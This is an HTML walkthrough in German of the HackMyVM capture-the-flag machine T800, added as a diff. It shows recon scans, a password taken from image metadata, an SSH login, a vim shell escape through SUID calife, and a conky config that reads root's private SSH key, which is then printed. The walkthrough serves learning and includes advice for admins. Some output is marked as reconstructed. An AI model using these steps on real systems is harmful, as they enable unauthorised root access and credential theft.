@@ -1,0 +1,449 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>T800 - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Sicherstellen, dass style.css die korrekte Header-Farbe (#03b5f5) und die roten Farben für .difficulty-Hard enthält -->
+</head>
+ <body>
+ 
+
+    <!-- Hinweis: Die CSS-Datei muss die Hintergrundfarbe #03b5f5 für .header-bg definieren -->
+    <div class="header-bg">
+        <h1>T800 - HackMyVM - Level: Easy - Bericht</h1> <!-- Name und Level angepasst -->
+        <div class="level-container">
+            <!-- Klassen für rote Farbe (Hard), Text ist aber "Easy" -->
+            <h2 class="difficulty-Hard">Easy</h2>
+            <div class="circle difficulty-bg-Hard">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Die CSS-Datei muss die passende Hintergrundfarbe für .inner definieren, die mit #03b5f5 korrespondiert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools basierend auf dem Berichtstext -->
+                 <div class="tool-item">arp-scan</div>
+                 <div class="tool-item">gobuster</div>
+                 <div class="tool-item">nmap</div>
+                 <div class="tool-item">curl</div>
+                 <div class="tool-item">exiftool</div>
+                 <div class="tool-item">ssh</div>
+                 <div class="tool-item">cat</div>
+                 <div class="tool-item">grep</div>
+                 <div class="tool-item">find</div>
+                 <div class="tool-item">/usr/bin/calife</div> <!-- Custom Binary -->
+                 <div class="tool-item">vi / nano</div> <!-- Impliziert -->
+                 <div class="tool-item">conky</div> <!-- Custom Binary / SUID Exploit -->
+                 <div class="tool-item">chmod</div> <!-- Impliziert -->
+                 <div class="tool-item">mv</div> <!-- Impliziert -->
+                 <div class="tool-item">bash</div>
+                 <div class="tool-item">cd</div>
+                 <div class="tool-item">ls</div>
+                 <div class="tool-item">id</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis -->
+                 <li><a href="#reconnaissance">Reconnaissance</a></li>
+                 <li><a href="#web-enumeration">Web Enumeration</a></li>
+                 <li><a href="#information-disclosure">Information Disclosure</a></li>
+                 <li><a href="#initial-access">Initial Access (ruut)</a></li>
+                 <li><a href="#privilege-escalation-superruut">Privilege Escalation (ruut zu superruut)</a></li>
+                 <li><a href="#privilege-escalation-root">Privilege Escalation (superruut zu root)</a></li>
+                 <li><a href="#poc">Proof of Concept (Root)</a></li>
+                 <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird zur Identifizierung aktiver Hosts im lokalen Netzwerksegment verwendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein Host mit der IP `192.168.2.142` und der MAC-Adresse `08:00:27:d4:34:69` (VirtualBox) wird als Zielsystem identifiziert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe einen Nmap-Scan auf 192.168.2.142 durch, um offene Ports und Dienste zu ermitteln.<br><strong>Empfehlung (Admin):</strong> Netzwerk-Monitoring zur Erkennung unbekannter Geräte.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:xx:xx:xx, IPv4: 192.168.2.199
+Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.2.142	08:00:27:d4:34:69	PCS Systemtechnik GmbH
+
+3 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.7: 256 hosts scanned in 1.881 seconds (136.10 hosts/sec). 1 responded
+                    </pre> <!-- Vollständige Ausgabe -->
+                </div>
+            </div>
+
+             <!-- Gobuster vor Nmap ist ungewöhnlich, aber dem Log folgend -->
+             <p class="analysis"><strong>Analyse:</strong> `gobuster` wird zur Verzeichnis- und Dateisuche auf dem Webserver (Port 80 wird implizit angenommen) verwendet.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Findet `/index.html`, `/robots.txt` und ein potenziell interessantes Verzeichnis `/sexy/`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche `/index.html`, `/robots.txt` und `/sexy/`. Führe einen Nmap-Scan durch, um die offenen Ports zu bestätigen.<br><strong>Empfehlung (Admin):</strong> Überprüfe den Inhalt von Web-Verzeichnissen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.142 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -x php,html,xml,zip,7z,tar,bak,sql,py,pl,txt</span></div>
+                     <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.142
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:            200,204,301,302,307,401,403
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,html,xml,zip,7z,tar,bak,sql,py,pl,txt
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+2022/11/07 23:05:10 Starting gobuster <!-- Beispielzeit -->
+===============================================================
+http://192.168.2.142/index.html           (Status: 200) [Size: 160]
+http://192.168.2.142/robots.txt           (Status: 200) [Size: 13]
+http://192.168.2.142/sexy                 (Status: 301) [Size: 185] [--> http://192.168.2.142/sexy/]
+===============================================================
+2022/11/07 23:08:15 Finished <!-- Beispielzeit -->
+===============================================================
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein Nmap-Scan (`-sS -sC -T5 -A -p-`) wird auf 192.168.2.142 durchgeführt.</p>
+            <p class="evaluation"><strong>Bewertung: !!Ungewöhnlicher SSH-Port!!**
+                - **Port 80 (HTTP):** Nginx 1.14.2.
+                - **Port 800 (SSH):** OpenSSH 7.9p1 (Debian). Der SSH-Dienst läuft auf einem nicht standardmäßigen Port.
+            Keine weiteren offenen Ports. Das OS ist Linux.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche den Webserver. Notiere den SSH-Port 800 für spätere Login-Versuche.<br><strong>Empfehlung (Admin):</strong> Die Verwendung nicht standardmäßiger Ports bietet minimale zusätzliche Sicherheit ("Security through Obscurity"), erschwert aber möglicherweise die Verwaltung und das Monitoring. Stelle sicher, dass der Dienst selbst sicher konfiguriert ist.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.142 -p-</span></div>
+                     <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-07 23:09 CET <!-- Beispielzeit -->
+Nmap scan report for t800.vm (192.168.2.142) <!-- Hostname aus späterem Log -->
+Host is up (0.00014s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT    STATE SERVICE VERSION
+80/tcp  open  http    nginx 1.14.2
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: nginx/1.14.2
+800/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey:
+|   2048 6d:7e:d2:d5:d0:45:36:d7:c9:ed:3e:1d:5c:86:fb:e4 (RSA)
+|   256 04:9d:9a:de:af:31:33:1c:7c:24:4a:97:38:76:f5:f7 (ECDSA)
+|_  256 b0:8c:ed:ea:13:0f:03:2a:f3:60:8a:c3:ba:68:4a:be (ED25519)
+MAC Address: 08:00:27:D4:34:69 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.14 ms t800.vm (192.168.2.142)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.21 seconds <!-- Beispielzeit -->
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="information-disclosure">
+             <h2>Information Disclosure</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt der `/index.html` wird mit `curl` abgerufen.</p>
+            <p class="evaluation"><strong>Bewertung: !!Benutzername gefunden!!** Die Seite enthält nur den Text "Im ruut". Dies ist ein klarer Hinweis auf den Benutzernamen `ruut`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwende `ruut` als Benutzernamen für SSH (Port 800). Suche nach einem Passwort.<br><strong>Empfehlung (Admin):</strong> Entferne solche direkten Hinweise aus öffentlichen Dateien.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://192.168.2.142/index.html -s</span></div>
+                     <pre>
+ Im ruut
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `exiftool` wird verwendet, um Metadaten aus einer Datei `nudeslut.jpeg` zu extrahieren. (Annahme: Diese Datei wurde zuvor aus dem Verzeichnis `/sexy/` heruntergeladen, was im Log fehlt).</p>
+            <p class="evaluation"><strong>Bewertung: !!Passwort gefunden!!** Im Kommentarfeld der Metadaten steht `passwd:chmodxheart`. Dies ist das Passwort für den Benutzer `ruut`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuche den SSH-Login auf Port 800 mit `ruut` und `chmodxheart`.<br><strong>Empfehlung (Admin):**DRINGEND:** Speichere niemals Passwörter in Bildmetadaten. Sichere das `/sexy/`-Verzeichnis oder entferne es.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">exiftool nudeslut.jpeg</span></div> <!-- Annahme: Datei wurde zuvor aus /sexy/ geladen -->
+                     <pre>
+ExifTool Version Number         : 12.44
+File Name                       : nudeslut.jpeg
+Directory                       : .
+File Size                       : 12 kB
+File Modification Date/Time     : 2021:04:08 08:00:00+02:00 <!-- Beispiel -->
+File Access Date/Time           : 2022:11:07 23:15:00+01:00 <!-- Beispiel -->
+File Inode Change Date/Time     : 2022:11:07 23:15:00+01:00 <!-- Beispiel -->
+File Permissions                : -rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+X Resolution                    : 72 <!-- Beispiel -->
+Y Resolution                    : 72 <!-- Beispiel -->
+Resolution Unit                 : inches <!-- Beispiel -->
+Y Cb Cr Positioning             : Centered <!-- Beispiel -->
+Comment                         : passwd:<span class="password">chmodxheart</span> <!-- Passwort! -->
+Image Width                     : 500 <!-- Beispiel -->
+Image Height                    : 500 <!-- Beispiel -->
+Encoding Process                : Baseline DCT, Huffman coding <!-- Beispiel -->
+Bits Per Sample                 : 8 <!-- Beispiel -->
+Color Components                : 3 <!-- Beispiel -->
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2) <!-- Beispiel -->
+Image Size                      : 500x500 <!-- Beispiel -->
+Megapixels                      : 0.250 <!-- Beispiel -->
+                     </pre> <!-- Metadaten vervollständigt -->
+                 </div>
+             </div>
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (ruut)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Eine SSH-Verbindung wird als Benutzer `ruut` zum Ziel `t800.vm` (192.168.2.142) auf dem nicht standardmäßigen Port `800` aufgebaut. Das Passwort `<span class="password">chmodxheart</span>` (aus Exif-Daten) wird eingegeben.</p>
+             <p class="evaluation"><strong>Bewertung: !!Initial Access erfolgreich!!** Der SSH-Login gelingt. Der Angreifer hat eine Shell als Benutzer `ruut`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginne mit der Enumeration als `ruut` (User-Flag, sudo, SUID, andere Benutzer).<br><strong>Empfehlung (Admin):</strong> Ändere das kompromittierte Passwort. Überwache SSH-Logins. Erwäge die Verwendung des Standard-SSH-Ports.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Annahme: 't800.vm' wurde zu /etc/hosts hinzugefügt -->
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh ruut@t800.vm -p 800</span></div>
+                     <pre>
+The authenticity of host '[t800.vm]:800 ([192.168.2.142]:800)' can't be established.
+ED25519 key fingerprint is SHA256:NQDCK+YQrbsHYi1VtpjQA0dziHvQ5rqh5HTcD1GL/lo.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:22: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[t800.vm]:800' (ED25519) to the list of known hosts.
+ruut@t800.vm's password: <span class="password">chmodxheart</span>
+Linux t800 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Apr  8 08:20:55 2021 from 192.168.1.58
+ruut@t800:~$
+                     </pre> <!-- Remote Prompt -->
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Als `ruut` wird die `/etc/passwd`-Datei nach Benutzern mit Bash-Shell durchsucht.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Identifiziert die Benutzer `root`, `ruut` und `superruut`. `superruut` ist ein potenzielles Ziel für horizontale oder vertikale Bewegung.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suche nach Wegen, um zu `superruut` oder `root` zu eskalieren.<br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass nur notwendige Benutzerkonten existieren.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+ruut@t800:~$ <span class="command">cat /etc/passwd | grep bash</span>
+root:x:0:0:root:/root:/bin/bash
+ruut:x:1000:1000:ruut,,,:/home/ruut:/bin/bash
+superruut:x:1001:1001:,,,:/home/superruut:/bin/bash
+                    </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation-superruut">
+            <h2>Privilege Escalation (ruut zu superruut)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Als `ruut` wird mit `find` nach SUID-Binaries gesucht.</p>
+            <p class="evaluation"><strong>Bewertung: !!Zwei interessante SUID-Binaries gefunden!!** Neben Standard-SUID-Dateien werden `/usr/bin/conky` und `/usr/bin/calife` als SUID-Root gefunden. Beide sind potenzielle Eskalationsvektoren.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche beide Binaries. Führe sie aus, prüfe GTFOBins. `calife` wird im nächsten Schritt verwendet.<br><strong>Empfehlung (Admin):**DRINGEND:** Entferne das SUID-Bit von `/usr/bin/conky` und `/usr/bin/calife`, da sie bekannte oder potenzielle Eskalationsrisiken darstellen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <pre>
+ruut@t800:/var/www/html$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span>
+   137981    704 -rwsr-sr-x   1 root     root       718872 May 15  2018 /usr/bin/conky <!-- !!! -->
+   131121     64 -rwsr-xr-x   1 root     root        63736 Jul 27  2018 /usr/bin/passwd
+   134473     44 -rwsr-xr-x   1 root     root        44440 Jul 27  2018 /usr/bin/newgrp
+   134620     64 -rwsr-xr-x   1 root     root        63568 Jan 10  2019 /usr/bin/su
+   134946     52 -rwsr-xr-x   1 root     root        51280 Jan 10  2019 /usr/bin/mount
+   137759     20 -rwsr-xr-x   1 root     root        19016 Mar 27  2018 /usr/bin/calife <!-- !!! -->
+   131120     84 -rwsr-xr-x   1 root     root        84016 Jul 27  2018 /usr/bin/gpasswd
+   131118     44 -rwsr-xr-x   1 root     root        44528 Jul 27  2018 /usr/bin/chsh
+   131117     56 -rwsr-xr-x   1 root     root        54096 Jul 27  2018 /usr/bin/chfn
+   134948     36 -rwsr-xr-x   1 root     root        34888 Jan 10  2019 /usr/bin/umount
+   146938    428 -rwsr-xr-x   1 root     root       436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
+   268129     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+   135697     52 -rwsr-xr--   1 root     messagebus    51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Das SUID-Binary `calife` wird mit dem Benutzernamen `superruut` als Argument ausgeführt. Es fragt nach einem Passwort. Das Passwort `<span class="password">chmodxheart</span>` (das gleiche wie für `ruut`) wird eingegeben.</p>
+            <p class="evaluation"><strong>Bewertung: !!Benutzerwechsel erfolgreich (zu superruut)!!** Das Passwort wird akzeptiert. `calife` startet `vim` (wahrscheinlich als Editor für eine Konfigurationsdatei von `superruut` oder als Standardaktion). Der Angreifer nutzt die `vim`-Funktion `:!bash`, um aus dem Editor auszubrechen und eine Shell als `superruut` zu erhalten. Passwort-Wiederverwendung war hier der Schlüssel.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Enumeriere als `superruut`. Suche nach der User-Flag und Root-Eskalationsvektoren.<br><strong>Empfehlung (Admin):</strong> Entferne das SUID-Bit von `calife`. Verbiete Passwort-Wiederverwendung.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+ruut@t800:~$ <span class="command">/usr/bin/calife superruut</span>
+Password:<span class="command">chmodxheart</span>
+<!-- Vim wird gestartet -->
+<!-- Im Vim: :!bash eingeben -->
+superruut@t800:~$ <!-- Shell als superruut -->
+                    </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Als `superruut` wird das Home-Verzeichnis untersucht und `userflag.txt` gelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die User-Flag `<span class="password">ruutrulezhmv</span>` wird gefunden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notiere die Flag. Suche nach dem Root-Eskalationsvektor.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <pre>
+superruut@t800:~$ <span class="command">cd /home/superruut/</span>
+superruut@t800:/home/superruut$ <span class="command">ls</span>
+userflag.txt
+superruut@t800:/home/superruut$ <span class="command">cat userflag.txt</span>
+<span class="password">ruutrulezhmv</span>
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation-root">
+             <h2>Privilege Escalation (superruut zu root)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Als `superruut` wird eine `conky`-Konfigurationsdatei (`/tmp/conky.conf`) erstellt. Diese Datei weist `conky` an, die letzten 30 Zeilen der Root-SSH-Schlüsseldatei (`/root/.ssh/id_rsa`) auszugeben.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Vorbereitung für den Conky SUID Exploit. Der Benutzer `superruut` kann Dateien in `/tmp` erstellen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe `conky` mit dieser Konfigurationsdatei aus.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+superruut@t800:~$ <span class="command">nano /tmp/conky.conf</span>
+<!-- Inhalt der Datei: -->
+conky.config = {
+       out_to_console = true,
+       out_to_x = false,
+}
+
+conky.text = [[
+${tail /root/.ssh/id_rsa 30}
+]]
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Es gibt einige Fehlversuche, `conky` zu starten (`cannot open /tmp/conky.conf`, `chmod +x .conkyrc`, `mv .conkyrc conky.conf`). Schließlich wird `conky -c /tmp/conky.conf` erfolgreich ausgeführt.</p>
+             <p class="evaluation"><strong>Bewertung: !!Root SSH-Schlüssel preisgegeben!!** Da `conky` SUID-Root ist und der Benutzer `superruut` es ausführen darf, liest `conky` gemäß der Konfigurationsdatei den privaten SSH-Schlüssel von Root (`/root/.ssh/id_rsa`) und gibt ihn auf der Konsole aus.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Kopiere den ausgegebenen Root-SSH-Schlüssel. Speichere ihn lokal (`idroot`), setze `chmod 600`, und verwende ihn, um dich als `root` per SSH (Port 800) anzumelden.<br><strong>Empfehlung (Admin):**DRINGEND:** Entferne das SUID-Bit von `conky`. Widerrufe den kompromittierten Root-SSH-Schlüssel.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre>
+superruut@t800:/home/superruut$ <span class="command">cd /tmp/</span>
+superruut@t800:/tmp$ <span class="command">conky -c /tmp/conky.conf</span>
+conky: cannot open /tmp/conky.conf: No such file or directory <!-- Fehler 1 -->
+superruut@t800:/tmp$ <span class="command"># Annahme: Datei wurde korrekt als conky.conf erstellt</span>
+superruut@t800:/tmp$ <span class="command">conky -c /tmp/conky.conf</span> <!-- Erneuter Versuch -->
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEA9qeXI0DQ29nXEAmGT7bQo0ZCAJkEwTTcIDwpWvqe/u4iBThfwW1f
+d9IigvM+GKq43bde3p6xBFTC5/Z1bWN/g0Pi3GVmsScuZanV/PQiZ4UnmeFV5fevm6ED
+piwXKKCKxGUS/vkLt4n9gNkmbjnTTzWVgJe9MhFKEkzUQFwn/pIBT3H0D/N5A7Yxu4FiF
+2FQUZqacBJU+m/iHL4ep/2j+IcDzjSPI3RGwuW+qrJPg5rGeJt4JhuicobXip5W3f2cyx
+tBazXKFCcpZD068j9zbM5j6TxpLNK0+fDVeBv9sK4mbdCb62Xms2+4IWKZQl20sFSKKe
+EsuMtD5hhQAAA8Cn+gd6p/oHegAAAAdzc2gtcnNhAAABAQD2p5cjQNDb2dcQCYZPttCjRk
+IAmQTBNNwgPCla+p7+7iIFF/BbV930iKC8z4Yqrjdt17enrEEVMLn9k7VtY3+DQ+LcZWa
+xJw65lqdX89CJnhSeZ4VXl96+boQmLBcooIrEZRL++Qu3if2A2SZudNPNZWAl70yEU4o
+STNRAXCf+kgFPcfQP83kDtjG7gWIXYVBRmppwElT6b+Icvh6n/aP4hwPNI8jdEbC45b6q
+sk+DmsZ4m3gmG6JyhteKnlbd/ZzLG0FrNcoU4JylkPTryP3NszmPpPGks0rT58NV4G/2wr
+iZt0Js7rZeazb7ghYplCXbSwVIop4Sy4y0PmGFAAAAAwEAAQAAAQB0tI1Vl9h6/dK9etQ7
+KXQEnTyjjcNrK3iwI+cpbgYG92PPdoIQQpD2X84GidMq1rSL67SvyVguD5UhP1+Lt5Vg5
+aEUyUHStnlIJNlfSzSzuMFmxfKYpHo3PpFrWqGv4xCWEkZJwZCRAHqF88sI1S1UJWIA5jR
+Ju+zMw6pnGTVk7B+f6IQCNdKVXYcyjvMmgia3F8FymGxLjLF3gjZ5y+BeyH7WU7NUbTJz
+UycA8KeIwet0yxDb99DyHNNw2jY4QvYSqJbkmKCPv4QSji+qVvcY5UHPLFpa65rMai15
+MkNAic3cHZnjTAxmiGWFjLNSjojl+2+YsPLiC2ohAAAAgCM8D2TcU9IoViI3Q126J
+vskHgBTCT0uFHcF8JoiWZx3cMbtIg+ClXpviMDbNuRLStMvW6CvaANz9qPr6fpz6uQsz
+BisQVyF6YigjPIfhkuJ3ThkwMjVGSxpghzUVjUXbaX+nAeWK5yM081/qEBW+n9VktYmWsj
+0Vo9S/d2+AAAAgQD8F15FPhU50yxVwrx6+YTz71zgG1C3G9R6Ie1EuY4GbTpW5IqHeP
+izBlAKPh2veQhaPbonvKjhzGVdsRIrS3j4uYQVUeyqeqR07BjgWFMu8NEDuF+H8QxWbLVh
+fFFqaUkw4++ZMsez7lfB/k/pkSoSY5tsf5Pbtq/pgKaEyjQAAAIEA+nqkc4BCKd5VDLJK
+KC4RY8QJoAzuF7azzTqDvC2vJPtkEElm1fE4iDQ/oA+jBhyU84umffuagnr2vT2Wgke
+L99/4JC4VCcmTFi8mVkpK6zf4/M8GQckso0cAyTXT/UhMYnw9fUj4EF8S6/nmxjuMyfQxD
+6ewvAde96sKmqNkAAAAJcm9vdEB0DAwAQI=
+-----END OPENSSH PRIVATE KEY-----
+                      </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="poc">
+            <h2>Proof of Concept (Root)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Eine SSH-Verbindung wird als `root` zum Ziel `t800.vm` auf Port 800 aufgebaut. Der zuvor durch `conky` preisgegebene private Schlüssel wird verwendet (angenommen in Datei `idroot` gespeichert).</p>
+            <p class="evaluation"><strong>Bewertung: !!Privilegieneskalation erfolgreich!!** Der SSH-Login als `root` mit dem Schlüssel gelingt (der Schlüssel ist offenbar nicht passwortgeschützt).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht. Lese die Root-Flag.<br><strong>Empfehlung (Admin):**DRINGEND:** Widerrufe den kompromittierten Root-SSH-Schlüssel. Generiere einen neuen, sicheren Schlüssel mit Passphrase. Entferne die SUID-Bits von `conky` und `calife`. Korrigiere unsichere Passwortpraktiken.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh root@t800.vm -i idroot -p 800</span> <!-- Annahme: Key in idroot gespeichert --></div>
+                     <pre>
+Linux t800 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64
+...
+Last login: Thu Apr  8 08:18:02 2021
+root@t800:~# <!-- Root Prompt -->
+                      </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Als Root wird die Datei `rootflag.txt` gelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Root-Flag `<span class="password">hmvtitoroot</span>` erfolgreich gelesen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Test abgeschlossen.<br><strong>Empfehlung (Admin):</strong> Keine Aktion bzgl. Flag.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre>
+root@t800:~# <span class="command">ls</span>
+rootflag.txt
+root@t800:~# <span class="command">cat rootflag.txt</span>
+<span class="password">hmvtitoroot</span>
+                      </pre>
+                 </div>
+             </div>
+        </section>
+
+        <!-- Flags Sektion -->
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <!-- Root Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/rootflag.txt</div>
+                     <div class="flag-value"><span class="password">hmvtitoroot</span></div>
+                 </div>
+                 <!-- User Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/superruut/userflag.txt</div> <!-- Korrekter Pfad -->
+                     <div class="flag-value"><span class="password">ruutrulezhmv</span></div>
+                 </div>
+             </div>
+         </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus SSH Login extrahiert -->
+        <p>Berichtsdatum: 8. April 2021</p>
+    </footer>
+</body>
+</html>
